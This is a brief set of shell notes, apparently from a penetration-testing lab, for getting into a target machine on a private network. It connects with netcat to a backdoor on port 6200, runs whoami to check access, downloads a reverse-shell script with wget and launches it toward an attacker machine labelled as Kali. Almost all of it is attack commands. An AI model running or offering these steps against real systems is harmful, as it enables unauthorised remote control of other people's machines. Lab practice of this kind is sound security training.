# this is the tab where the backdoor is running
nc 192.168.1.101 6200

# ---
# commands for work check
ls
whoami
# ---


wget 192.168.1.101:8080/reverse-shell.py
python reverse-shell.py 192.168.1.100 & # 192.168.1.100 - ip kali / server ip
